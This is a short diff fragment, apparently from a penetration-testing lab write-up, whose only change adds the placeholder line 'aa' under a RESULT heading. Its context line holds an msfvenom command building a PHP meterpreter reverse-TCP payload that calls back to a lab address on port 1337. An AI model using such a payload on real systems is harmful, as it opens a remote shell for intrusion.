@@ -95,5 +95,6 @@ msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.14.26 lport=1337 -f raw > re
 
 > RESULT
 
+aa
 
 
